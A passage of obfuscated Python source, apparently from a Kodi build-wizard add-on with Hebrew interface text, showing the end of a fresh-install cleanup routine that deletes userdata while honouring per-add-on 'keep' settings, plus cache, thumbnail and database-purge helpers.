				elif OOOOOO0O000O00OOO =='MyVideos107.db'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4955
				elif OOOOOO0O000O00OOO =='MyVideos116.db'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4956
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4957
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'skin.anonymous.mod'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4958
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'skin.Premium.mod'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4959
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'skin.anonymous.nox'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4960
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'skin.phenomenal'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4961
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.metalliq'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4962
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'skin.titan'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4964
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'pvr.iptvsimple'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4965
				elif OOOOOO0O000O00OOO =='sources.xml'and OO00O0000O00OO0O0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4967
				elif OOOOOO0O000O00OOO =='quicknav.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4970
				elif OOOOOO0O000O00OOO =='x1101.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4971
				elif OOOOOO0O000O00OOO =='b-srtym-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4972
				elif OOOOOO0O000O00OOO =='x1102.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4973
				elif OOOOOO0O000O00OOO =='b-sdrvt-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4974
				elif OOOOOO0O000O00OOO =='x1112.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4975
				elif OOOOOO0O000O00OOO =='b-tlvvyzyh-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4976
				elif OOOOOO0O000O00OOO =='x1111.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4977
				elif OOOOOO0O000O00OOO =='b-tvknyshrly-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4978
				elif OOOOOO0O000O00OOO =='x1110.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4979
				elif OOOOOO0O000O00OOO =='b-yldym-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4980
				elif OOOOOO0O000O00OOO =='x1114.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4981
				elif OOOOOO0O000O00OOO =='b-mvzyqh-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4982
				elif OOOOOO0O000O00OOO =='mainmenu.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4983
				elif OOOOOO0O000O00OOO =='skin.Premium.mod.properties'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4984
				elif OOOOOO0O000O00OOO =='x1122.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4986
				elif OOOOOO0O000O00OOO =='b-spvrt-b.DATA.xml'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4987
				elif OOOOOO0O000O00OOO =='favourites.xml'and OO00O0000O00OO0O0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4992
				elif OOOOOO0O000O00OOO =='guisettings.xml'and OO00O0000O00OO0O0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4994
				elif OOOOOO0O000O00OOO =='profiles.xml'and OO00O0000O00OO0O0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4995
				elif OOOOOO0O000O00OOO =='advancedsettings.xml'and OO00O0000O00OO0O0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4996
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4997
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'program.apollo'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4998
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4999
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.telemedia'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5000
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.elementum'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5003
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5005
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'weather.yahoo'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5006
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.quasar'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5007
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'program.apollo'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5008
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5009
				elif OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5010
				elif OOOOOO0O000O00OOO in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOOO0O000O00OOO ,xbmc .LOGNOTICE )#line:5011
				elif OOOOOO0O000O00OOO .endswith ('.db'):#line:5012
					try :#line:5013
						if OOOOOO0O000O00OOO ==OO0OO000O00OO0000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOOO0O000O00OOO ,KODIV ),xbmc .LOGNOTICE )#line:5014
						else :os .remove (os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ))#line:5015
					except Exception as OO00O00000OO0OOO0 :#line:5016
						if not OOOOOO0O000O00OOO .startswith ('Textures13'):#line:5017
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5018
							wiz .log ("-> %s"%(str (OO00O00000OO0OOO0 )),xbmc .LOGNOTICE )#line:5019
							wiz .purgeDb (os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ))#line:5020
				else :#line:5021
					DP .update (int (wiz .percentage (OO0OO000000O00OO0 ,OO000OOOOOO00OO0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0O000O00OOO ),'')#line:5022
					try :os .remove (os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ))#line:5023
					except Exception as OO00O00000OO0OOO0 :#line:5024
						wiz .log ("Error removing %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:5025
						wiz .log ("-> / %s"%(str (OO00O00000OO0OOO0 )),xbmc .LOGNOTICE )#line:5026
			if DP .iscanceled ():#line:5027
				DP .close ()#line:5028
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5029
				return False #line:5030
		for O0O00OO0O00OO0OOO ,O000OO000000OOOOO ,OO00O00O0OO00O000 in os .walk (O00OO00O00OO0OOO0 ,topdown =True ):#line:5031
			O000OO000000OOOOO [:]=[O00OOO00OO0O00OO0 for O00OOO00OO0O00OO0 in O000OO000000OOOOO if O00OOO00OO0O00OO0 not in EXCLUDES ]#line:5032
			for OOOOOO0O000O00OOO in O000OO000000OOOOO :#line:5033
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOO0O000O00OOO ),'')#line:5034
			  if OOOOOO0O000O00OOO not in ["Database","userdata","temp","addons","addon_data"]:#line:5035
			   if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5036
			    if not (OOOOOO0O000O00OOO =='skin.titan'and KEEPSKIN3 =='true'):#line:5038
			      if not (OOOOOO0O000O00OOO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5039
			       if not (OOOOOO0O000O00OOO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5040
			        if not (OOOOOO0O000O00OOO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5041
			         if not (OOOOOO0O000O00OOO =='program.apollo'and KEEPINFO =='true'):#line:5042
			          if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5043
			           if not (OOOOOO0O000O00OOO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5044
			            if not (OOOOOO0O000O00OOO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5045
			             if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5046
			              if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5047
			               if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5048
			                if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5049
			                 if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5050
			                  if not (OOOOOO0O000O00OOO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5051
			                   if not (OOOOOO0O000O00OOO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5052
			                    if not (OOOOOO0O000O00OOO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5053
			                     if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5054
			                      if not (OOOOOO0O000O00OOO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5055
			                       if not (OOOOOO0O000O00OOO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5056
			                           if not (OOOOOO0O000O00OOO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5060
			                            if not (OOOOOO0O000O00OOO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5061
			                             if not (OOOOOO0O000O00OOO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5062
			                              if not (OOOOOO0O000O00OOO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5063
			                               if not (OOOOOO0O000O00OOO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5064
			                                  shutil .rmtree (os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),ignore_errors =True ,onerror =None )#line:5066
			if DP .iscanceled ():#line:5067
				DP .close ()#line:5068
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5069
				return False #line:5070
		DP .close ()#line:5071
		wiz .clearS ('build')#line:5072
		if over ==True :#line:5073
			return True #line:5074
		elif install =='restore':#line:5075
			return True #line:5076
		elif install :#line:5077
			buildWizard (install ,'normal',over =True )#line:5078
		else :#line:5079
			if INSTALLMETHOD ==1 :O0O0000O0000O00O0 =1 #line:5080
			elif INSTALLMETHOD ==2 :O0O0000O0000O00O0 =0 #line:5081
			else :O0O0000O0000O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5082
			if O0O0000O0000O00O0 ==1 :wiz .reloadFix ('fresh')#line:5083
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5084
	else :#line:5085
		if not install =='restore':#line:5086
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5087
			wiz .refresh ()#line:5088
def clearCache ():#line:5093
		wiz .clearCache ()#line:5094
def fixwizard ():#line:5098
		wiz .fixwizard ()#line:5099
def totalClean ():#line:5101
		wiz .clearCache ()#line:5103
		wiz .clearPackages ('total')#line:5104
		clearThumb ('total')#line:5105
		cleanfornewbuild ()#line:5106
def cleanfornewbuild ():#line:5107
		try :#line:5108
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5109
		except :#line:5110
			pass #line:5111
		try :#line:5112
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5113
		except :#line:5114
			pass #line:5115
		try :#line:5116
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5117
		except :#line:5118
			pass #line:5119
def clearThumb (type =None ):#line:5120
	O00OO00OO000O0000 =wiz .latestDB ('Textures')#line:5121
	if not type ==None :O0O00O0OOOOO0O0OO =1 #line:5122
	else :O0O00O0OOOOO0O0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O00OO00OO000O0000 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5123
	if O0O00O0OOOOO0O0OO ==1 :#line:5124
		try :wiz .removeFile (os .join (DATABASE ,O00OO00OO000O0000 ))#line:5125
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O00OO00OO000O0000 )#line:5126
		wiz .removeFolder (THUMBS )#line:5127
	else :wiz .log ('Clear thumbnames cancelled')#line:5129
	wiz .redoThumbs ()#line:5130
def purgeDb ():#line:5132
	OO0OOOO0OO0OOOOO0 =[];OOO0O0OO0O0OOOO00 =[]#line:5133
	for OO0O0O00O00O0O00O ,OOO00000OO000O000 ,OOO00OO000O0OO0OO in os .walk (HOME ):#line:5134
		for O0OO0O0000OO0000O in fnmatch .filter (OOO00OO000O0OO0OO ,'*.db'):#line:5135
			if O0OO0O0000OO0000O !='Thumbs.db':#line:5136
				O00OO00O00O0OO000 =os .path .join (OO0O0O00O00O0O00O ,O0OO0O0000OO0000O )#line:5137
				OO0OOOO0OO0OOOOO0 .append (O00OO00O00O0OO000 )#line:5138
				O00OOOOOO000OOOO0 =O00OO00O00O0OO000 .replace ('\\','/').split ('/')#line:5139
				OOO0O0OO0O0OOOO00 .append ('(%s) %s'%(O00OOOOOO000OOOO0 [len (O00OOOOOO000OOOO0 )-2 ],O00OOOOOO000OOOO0 [len (O00OOOOOO000OOOO0 )-1 ]))#line:5140
	if KODIV >=16 :#line:5141
		OOOO0O0OO0OO0O0OO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOO0O0OO0O0OOOO00 )#line:5142
		if OOOO0O0OO0OO0O0OO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5143
		elif len (OOOO0O0OO0OO0O0OO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5144
		else :#line:5145
			for O0OO0O0OO0O00O000 in OOOO0O0OO0OO0O0OO :wiz .purgeDb (OO0OOOO0OO0OOOOO0 [O0OO0O0OO0O00O000 ])#line:5146
	else :#line:5147
